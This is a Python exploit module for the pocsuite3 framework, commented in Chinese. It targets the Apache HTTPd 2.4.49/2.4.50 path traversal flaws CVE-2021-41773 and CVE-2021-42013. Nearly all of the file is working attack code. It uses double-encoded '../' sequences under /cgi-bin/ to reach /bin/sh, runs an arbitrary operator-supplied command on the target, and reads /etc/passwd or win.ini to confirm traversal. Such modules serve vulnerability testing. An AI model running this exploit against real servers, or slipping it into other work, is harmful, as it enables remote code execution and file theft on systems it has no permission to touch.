from urllib.error import HTTPError

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, OptString
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import urllib.request
import urllib
class DemoPOC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0
    version = '1.0'  # 默认为1
    author = 'Oulaa'  # PoC 作者的大名
    vulDate = '2021-10-5'  # 漏洞公开的时间，不知道就写今天
    createDate = '2021-10-5'  # 编写 PoC 的日期
    updateDate = '2021-10-5'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源，0day 不用写
    name = 'CVE-2021-41773/CVE-2021-42013 Apache HTTPd (2.4.49/2.4.50)'  # PoC 名称
    appPowerLink = 'Apache HTTPd'  # 漏洞厂商主页地址
    appName = 'Apache HTTPd'  # 漏洞应用名称
    appVersion = '2.4.49/2.4.50'  # 漏洞影响版本
    vulType = 'Path Traversal'  # 漏洞类型，类型参考见漏洞类型规范表
    desc = '''
            Apache HTTPd 中间件2.4.49/2.4.50版本的目录穿越漏洞，在开启了CGI的情况下可以做到RCE。
        '''  # 漏洞简要描述
    samples = []  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' Apache HTTPd 2.4.49/2.4.50 验证是否存在目录穿越/RCE
    cmd 参数是必须的,用于attack模块执行你想要执行的命令。
    '''
    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('', description='[+]请输入你想执行的命令', require=True)
        return o
    def _check(self, url):
        apache = OrderedDict()
        verify = "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/"
        data = b"echo Content-Type: text/plain;echo;echo Hello"
        # check RCE
        urlLR = url+"/cgi-bin"+verify+"bin/sh"
        try:
            r = urllib.request.urlopen(urlLR,data=data,timeout=5)
            if "Hello" in r.read().decode('utf-8'):
                print("[+]Linux RCE SUCCESS")
                apache[0] = "Linux"
                apache[1] = "RCE"
                return apache
            else:
                urlLT = url+"/cgi-bin"+verify+"etc/passwd"
                r = urllib.request.urlopen(url=urlLT)
                if "root" in r.read().decode('utf-8'):
                    print("[+]Linux Directory Traversal SUCCESS")
                    apache[0] = "Linux"
                    apache[1] = "Directory Traversal"
                    return apache
                else:
                    urlWT = url+"/cgi-bin"+verify+"c:/Windows/win.ini"
                    r = urllib.request.urlopen(url=urlWT)
                    if "extensions" in r.read().decode('utf-8'):
                        print("[+]Windows Directory Traversal SUCCESS")
                        apache[0] = "Linux"
                        apache[1] = "Windows"
                        return apache
                    else:
                        return False
        except Exception as e:
            print(e)

    def _verify(self):
        result ={}
        apache = self._check(self.url)
        if apache:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['SYSTEM'] = apache[0]
            result['VerifyInfo']['TYPE'] = apache[1]
        return self.parse_output(result)

    def _attack(self):
        result = {}
        verify = "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/"
        data = "echo Content-Type: text/plain;echo;%s"%(self.get_option("cmd"),)
        data = bytes(data,encoding="utf-8")
        urlLR = self.url+"/cgi-bin"+verify+"bin/sh"
        try:
            r = urllib.request.urlopen(url=urlLR,data=data)
            if r.status==200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['RCE RESULT'] = r.read().decode('utf-8')
        except Exception as e:
            pass
        return self.parse_output(result)
    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('[-]target is not vulnerable')
        return output


register_poc(DemoPOC)
